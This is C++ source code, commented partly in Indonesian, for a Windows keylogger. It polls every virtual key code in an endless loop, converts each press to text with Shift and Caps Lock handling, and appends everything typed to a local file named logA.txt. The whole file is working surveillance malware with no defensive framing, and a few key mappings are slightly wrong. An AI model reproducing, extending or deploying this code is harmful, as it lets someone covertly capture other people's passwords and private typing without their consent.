#include <iostream>
#include <windows.h>

using namespace std;

const int durasiTidur = 100;

void mulaiKeylogger(char* namaBerkas){
	
	FILE *file;
    char val[5];
	file = fopen(namaBerkas, "a+");
	
	
	// Mengulang terus menerus
	while(1){
		
		// Perulangan kemungkinan semua keycode Windows API sebanyak 2 byte = 256 keycode
		for(int vkCode = 0; vkCode < 0xFF; vkCode++){
			
			// Pengguna menekan keyboard
			if(GetAsyncKeyState(vkCode) & 0x8000 ){
				
				// Keycode yang ditekan diolah pada fungsi olahMasukan
			    
			    if ((vkCode>=39)&&(vkCode<=64)) // Keys 0-9
			    {
			        if (GetAsyncKeyState(VK_SHIFT)) // Check if shift key is down (fairly accurate)
			        {
			            switch (vkCode) // 0x30-0x39 is 0-9 respectively
			            {
			            case 0x30:
			                fputs(")",file);
			                break;
			            case 0x31:
			                fputs("!",file);
			                break;
			            case 0x32:
			                fputs("@",file); 
			                break;
			            case 0x33:
			                fputs("#",file);  
			                break;
			            case 0x34:
			                fputs("$",file);   
			                break;
			            case 0x35:
			                fputs("%",file);  
			                break;
			            case 0x36:
			                fputs("^",file);  
			                break;
			            case 0x37:
			                fputs("&",file);  
			                break;
			            case 0x38:
			                fputs("*",file);  
			                break;
			            case 0x39:
			                fputs("(",file);  
			                break;
			            }
			        }
			        else // If shift key is not down
			        {
						sprintf(val,"%c",vkCode);
						fputs(val,file);  
			        }
			    }
			    else if ((vkCode>64)&&(vkCode<91)) // Keys a-z
			    {
			        /*
			        The following is a complicated statement to check if the letters need to be switched to lowercase.
			        Here is an explanation of why the exclusive or (XOR) must be used.
			        
			        Shift   Caps    LowerCase    UpperCase
			        T       T       T            F
			        T       F       F            T
			        F       T       F            T
			        F       F       T            F
			        
			        The above truth table shows what case letters are typed in,
			        based on the state of the shift and caps lock key combinations.
			        
			        The UpperCase column is the same result as a logical XOR.
			        However, since we're checking the opposite in the following if statement, we'll also include a NOT operator (!)
			        Becuase, NOT(XOR) would give us the LowerCase column results.
			        
			        There's your lesson in logic if you didn't understand the next statement. Hopefully that helped.
			        
			        --Dan
			        */
			        
			        if (!(GetKeyState(VK_SHIFT)^((GetKeyState(VK_CAPITAL) & 0x0001) != 0))) // Check if letters should be lowercase
			        {
			            vkCode+=32; // Un-capitalize letters
			        }
			        sprintf(val,"%c",vkCode);
			        fputs(val,file);  
			    }
			    else
			    {
			        switch (vkCode) // Check for other keys
			        {
			            case VK_SPACE:
			                fputs(" ",file);
			                break;
			            case VK_LCONTROL:
			            case VK_RCONTROL:
			                fputs("[Ctrl]",file);
			                break;
			            case VK_LMENU:
			            case VK_RMENU:
			                fputs("[Alt]",file);
			                break;
			            case VK_INSERT:
			                fputs("[Insert]",file);
			                break;
			            case VK_DELETE:
			                fputs("[Del]",file);
			                break;
			            case VK_NUMPAD0:
			                fputs("0",file);
			                break;
			            case VK_NUMPAD1:
			                fputs("1",file);
			                break;
			            case VK_NUMPAD2:
			                fputs("2",file);
			                break;
			            case VK_NUMPAD3:
			                fputs("3",file);
			                break;
			            case VK_NUMPAD4:
			                fputs("4",file);
			                break;
			            case VK_NUMPAD5:
			                fputs("5",file);
			                break;
			            case VK_NUMPAD6:
			                fputs("6",file);
			                break;
			            case VK_NUMPAD7:
			                fputs("7",file);
			                break;
			            case VK_NUMPAD8:
			                fputs("8",file);
			                break;
			            case VK_NUMPAD9:
			                fputs("9",file);
			                break;
			            case VK_OEM_2:
			                if (GetAsyncKeyState(VK_SHIFT))
			                     fputs("?",file);
			                else
			                     fputs("/",file);
			                break;
			            case VK_OEM_3:
			                if (GetAsyncKeyState(VK_SHIFT))
			                     fputs("~",file);
			                else
			                     fputs("`",file);
			                break;
			            case VK_OEM_4:
			                 if(GetAsyncKeyState(VK_SHIFT))
			                    fputs("{",file);
			                 else
			                    fputs("[",file);
			                 break;
			            case VK_OEM_5:
			                 if(GetAsyncKeyState(VK_SHIFT))
			                    fputs("|",file);
			                 else
			                    fputs("\\",file);
			                 break;
			            case VK_OEM_6:
			                 if(GetAsyncKeyState(VK_SHIFT))
			                    fputs("}",file);
			                 else
			                    fputs("]",file);
			                 break;
			            case VK_OEM_7:
			                 if(GetAsyncKeyState(VK_SHIFT))
			                    fputs("\\",file);
			                 else
			                    fputs("'",file);
			                 break;
			            case VK_LSHIFT:
			            case VK_RSHIFT:
			                // do nothing;
			                break;
			            case 0xBC:                //comma       
			                 if(GetAsyncKeyState(VK_SHIFT))
			                    fputs("<",file);
			                 else
			                    fputs(",",file);
			                 break;
			            case 0xBE:              //Period
			                 if(GetAsyncKeyState(VK_SHIFT))
			                    fputs(">",file);
			                 else
			                    fputs(".",file);
			                 break;
			            case 0xBA:              //Semi Colon same as VK_OEM_1
			                 if(GetAsyncKeyState(VK_SHIFT))
			                    fputs(":",file);
			                 else
			                    fputs(";",file);
			                 break;
			            case 0xBD:              //Minus
			                 if(GetAsyncKeyState(VK_SHIFT))
			                    fputs("_",file);
			                 else
			                    fputs("-",file);
			                 break;
			            case 0xBB:              //Equal
			                 if(GetAsyncKeyState(VK_SHIFT))
			                    fputs("+",file);
			                 else
			                    fputs("=",file);
			                 break;
			        }
			    }
				//cout << i << endl;
				
				// Berhenti sebentar
				Sleep(durasiTidur);
			}
		}
	}
	
	fclose(file);
}

int main(){
	
	mulaiKeylogger("logA.txt");
	
	return 0;
}
